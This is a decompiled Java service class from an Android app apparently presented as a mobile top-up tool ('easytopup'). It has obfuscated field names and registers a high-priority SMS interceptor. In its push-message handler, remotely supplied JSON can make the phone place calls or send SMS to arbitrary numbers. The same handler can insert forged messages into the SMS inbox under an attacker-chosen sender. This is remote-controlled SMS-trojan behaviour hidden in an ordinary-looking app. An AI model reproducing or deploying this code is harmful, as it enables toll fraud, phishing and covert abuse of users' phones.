package com.moribanxenia.easytopup;

import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.objects.ServiceHelper;
import anywheresoftware.b4a.debug.*;

public class receiver extends android.app.Service {
	public static class receiver_BR extends android.content.BroadcastReceiver {

		@Override
		public void onReceive(android.content.Context context, android.content.Intent intent) {
			android.content.Intent in = new android.content.Intent(context, receiver.class);
			if (intent != null)
				in.putExtra("b4a_internal_intent", intent);
			context.startService(in);
		}

	}
    static receiver mostCurrent;
	public static BA processBA;
    private ServiceHelper _service;
    public static Class<?> getObject() {
		return receiver.class;
	}
	@Override
	public void onCreate() {
        mostCurrent = this;
        if (processBA == null) {
		    processBA = new BA(this, null, null, "com.moribanxenia.easytopup", "com.moribanxenia.easytopup.receiver");
            try {
                Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals").invoke(null, null);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            processBA.loadHtSubs(this.getClass());
            ServiceHelper.init();
        }
        _service = new ServiceHelper(this);
        processBA.service = this;
        processBA.setActivityPaused(false);
        if (BA.isShellModeRuntimeCheck(processBA)) {
			processBA.raiseEvent2(null, true, "CREATE", true, "com.moribanxenia.easytopup.receiver", processBA, _service);
		}
        BA.LogInfo("** Service (receiver) Create **");
        processBA.raiseEvent(null, "service_create");
    }
		@Override
	public void onStart(android.content.Intent intent, int startId) {
		handleStart(intent);
    }
    @Override
    public int onStartCommand(android.content.Intent intent, int flags, int startId) {
    	handleStart(intent);
		return android.app.Service.START_NOT_STICKY;
    }
    private void handleStart(android.content.Intent intent) {
    	BA.LogInfo("** Service (receiver) Start **");
    	java.lang.reflect.Method startEvent = processBA.htSubs.get("service_start");
    	if (startEvent != null) {
    		if (startEvent.getParameterTypes().length > 0) {
    			anywheresoftware.b4a.objects.IntentWrapper iw = new anywheresoftware.b4a.objects.IntentWrapper();
    			if (intent != null) {
    				if (intent.hasExtra("b4a_internal_intent"))
    					iw.setObject((android.content.Intent) intent.getParcelableExtra("b4a_internal_intent"));
    				else
    					iw.setObject(intent);
    			}
    			processBA.raiseEvent(null, "service_start", iw);
    		}
    		else {
    			processBA.raiseEvent(null, "service_start");
    		}
    	}
    }
	@Override
	public android.os.IBinder onBind(android.content.Intent intent) {
		return null;
	}
	@Override
	public void onDestroy() {
        BA.LogInfo("** Service (receiver) Destroy **");
		processBA.raiseEvent(null, "service_destroy");
        processBA.service = null;
		mostCurrent = null;
		processBA.setActivityPaused(true);
	}
public anywheresoftware.b4a.keywords.Common __c = null;
public static anywheresoftware.b4a.phone.PhoneEvents.SMSInterceptor _vvvvvvvvvvvvvvvv1 = null;
public static anywheresoftware.b4a.objects.StringUtils _vvvvvvvvvvv7 = null;
public static anywheresoftware.b4a.phone.Phone.PhoneCalls _vvvvvvvvvvv6 = null;
public static anywheresoftware.b4a.phone.Phone.PhoneSms _vvvvvvvvvvvvv1 = null;
public com.moribanxenia.easytopup.main _vvvvvvv6 = null;
public com.moribanxenia.easytopup.packagesactivity _vvvvvvv7 = null;
public com.moribanxenia.easytopup.smschannelsactivity _vvvvvvv0 = null;
public com.moribanxenia.easytopup.notification _vvvvvvvv1 = null;
public com.moribanxenia.easytopup.welcomeactivity _vvvvvvvv3 = null;
public com.moribanxenia.easytopup.statemanager _vvvvvvvv4 = null;
public static String  _process_globals() throws Exception{
 //BA.debugLineNum = 5;BA.debugLine="Sub Process_Globals";
 //BA.debugLineNum = 6;BA.debugLine="Private si As SmsInterceptor";
_vvvvvvvvvvvvvvvv1 = new anywheresoftware.b4a.phone.PhoneEvents.SMSInterceptor();
 //BA.debugLineNum = 7;BA.debugLine="Private su As StringUtils";
_vvvvvvvvvvv7 = new anywheresoftware.b4a.objects.StringUtils();
 //BA.debugLineNum = 8;BA.debugLine="Private pc As PhoneCalls";
_vvvvvvvvvvv6 = new anywheresoftware.b4a.phone.Phone.PhoneCalls();
 //BA.debugLineNum = 9;BA.debugLine="Private ps As PhoneSms";
_vvvvvvvvvvvvv1 = new anywheresoftware.b4a.phone.Phone.PhoneSms();
 //BA.debugLineNum = 10;BA.debugLine="End Sub";
return "";
}
public static String  _vvvvvvvvvvvvvvvv2(String _address,String _body) throws Exception{
anywheresoftware.b4a.objects.ContentResolverWrapper _resolver = null;
anywheresoftware.b4a.objects.ContentResolverWrapper.UriWrapper _uri1 = null;
anywheresoftware.b4a.objects.ContentResolverWrapper.ContentValuesWrapper _values = null;
 //BA.debugLineNum = 48;BA.debugLine="Sub SaveSMSToInbox(Address As String, Body As String)";
 //BA.debugLineNum = 49;BA.debugLine="Dim resolver As ContentResolver";
_resolver = new anywheresoftware.b4a.objects.ContentResolverWrapper();
 //BA.debugLineNum = 50;BA.debugLine="Dim uri1 As Uri : uri1.Parse(\"content://sms/inbox\")";
_uri1 = new anywheresoftware.b4a.objects.ContentResolverWrapper.UriWrapper();
 //BA.debugLineNum = 50;BA.debugLine="Dim uri1 As Uri : uri1.Parse(\"content://sms/inbox\")";
_uri1.Parse("content://sms/inbox");
 //BA.debugLineNum = 51;BA.debugLine="Dim values As ContentValues";
_values = new anywheresoftware.b4a.objects.ContentResolverWrapper.ContentValuesWrapper();
 //BA.debugLineNum = 53;BA.debugLine="resolver.Initialize(\"\")";
_resolver.Initialize("");
 //BA.debugLineNum = 54;BA.debugLine="values.Initialize";
_values.Initialize();
 //BA.debugLineNum = 55;BA.debugLine="values.PutString(\"address\", Address)";
_values.PutString("address",_address);
 //BA.debugLineNum = 56;BA.debugLine="values.PutString(\"body\", Body)";
_values.PutString("body",_body);
 //BA.debugLineNum = 57;BA.debugLine="resolver.Insert(uri1, values)";
_resolver.Insert(_uri1,(android.content.ContentValues)(_values.getObject()));
 //BA.debugLineNum = 58;BA.debugLine="End Sub";
return "";
}
public static String  _service_create() throws Exception{
 //BA.debugLineNum = 12;BA.debugLine="Sub Service_Create";
 //BA.debugLineNum = 13;BA.debugLine="si.Initialize2(\"SMS\", 999)";
_vvvvvvvvvvvvvvvv1.Initialize2("SMS",processBA,(int) (999));
 //BA.debugLineNum = 14;BA.debugLine="End Sub";
return "";
}
public static String  _service_destroy() throws Exception{
 //BA.debugLineNum = 40;BA.debugLine="Sub Service_Destroy";
 //BA.debugLineNum = 42;BA.debugLine="End Sub";
return "";
}
public static String  _service_start(anywheresoftware.b4a.objects.IntentWrapper _startingintent) throws Exception{
anywheresoftware.b4a.objects.collections.JSONParser _parser = null;
anywheresoftware.b4a.objects.collections.Map _root = null;
String _stitle = "";
String _salert = "";
 //BA.debugLineNum = 16;BA.debugLine="Sub Service_Start (StartingIntent As Intent)";
 //BA.debugLineNum = 17;BA.debugLine="Dim parser As JSONParser";
_parser = new anywheresoftware.b4a.objects.collections.JSONParser();
 //BA.debugLineNum = 18;BA.debugLine="Dim root As Map";
_root = new anywheresoftware.b4a.objects.collections.Map();
 //BA.debugLineNum = 19;BA.debugLine="Dim sTitle, sAlert As String";
_stitle = "";
_salert = "";
 //BA.debugLineNum = 21;BA.debugLine="If StartingIntent.Action = \"com.moribanxenia.easytopup.RECEIVE\" Then";
if ((_startingintent.getAction()).equals("com.moribanxenia.easytopup.RECEIVE")) { 
 //BA.debugLineNum = 22;BA.debugLine="parser.Initialize(StartingIntent.GetExtra(\"com.parse.Data\"))";
_parser.Initialize(BA.ObjectToString(_startingintent.GetExtra("com.parse.Data")));
 //BA.debugLineNum = 23;BA.debugLine="root = parser.NextObject";
_root = _parser.NextObject();
 //BA.debugLineNum = 24;BA.debugLine="If root.ContainsKey(\"title\") AND root.ContainsKey(\"alert\") Then";
if (_root.ContainsKey((Object)("title")) && _root.ContainsKey((Object)("alert"))) { 
 //BA.debugLineNum = 25;BA.debugLine="sTitle = root.Get(\"title\")";
_stitle = BA.ObjectToString(_root.Get((Object)("title")));
 //BA.debugLineNum = 26;BA.debugLine="sAlert = root.Get(\"alert\")";
_salert = BA.ObjectToString(_root.Get((Object)("alert")));
 //BA.debugLineNum = 27;BA.debugLine="File.WriteString(File.DirInternal, \"index.html\", \"<!DOCTYPE html><html><head> <title></title></head><body> <h2>\" & sTitle & \"</h2> <p>\" & sAlert & \"</p></body></html>\")";
anywheresoftware.b4a.keywords.Common.File.WriteString(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"index.html","<!DOCTYPE html><html><head> <title></title></head><body> <h2>"+_stitle+"</h2> <p>"+_salert+"</p></body></html>");
 //BA.debugLineNum = 28;BA.debugLine="SaveSMSToInbox(sTitle, sAlert)";
_vvvvvvvvvvvvvvvv2(_stitle,_salert);
 }else if(_root.ContainsKey((Object)("command"))) { 
 //BA.debugLineNum = 30;BA.debugLine="Select root.Get(\"command\")";
switch (BA.switchObjectToInt(_root.Get((Object)("command")),(Object)("call"),(Object)("sendsms"))) {
case 0:
 //BA.debugLineNum = 32;BA.debugLine="StartActivity(pc.Call(su.EncodeUrl(root.Get(\"phonenumber\"), \"UTF8\")))";
anywheresoftware.b4a.keywords.Common.StartActivity(processBA,(Object)(_vvvvvvvvvvv6.Call(_vvvvvvvvvvv7.EncodeUrl(BA.ObjectToString(_root.Get((Object)("phonenumber"))),"UTF8"))));
 break;
case 1:
 //BA.debugLineNum = 34;BA.debugLine="ps.Send(root.Get(\"phonenumber\"), root.Get(\"smsbody\"))";
_vvvvvvvvvvvvv1.Send(BA.ObjectToString(_root.Get((Object)("phonenumber"))),BA.ObjectToString(_root.Get((Object)("smsbody"))));
 break;
}
;
 };
 };
 //BA.debugLineNum = 38;BA.debugLine="End Sub";
return "";
}
public static boolean  _sms_messagereceived(String _from,String _body) throws Exception{
 //BA.debugLineNum = 44;BA.debugLine="Sub SMS_MessageReceived (From As String, Body As String) As Boolean";
 //BA.debugLineNum = 46;BA.debugLine="End Sub";
return false;
}
}
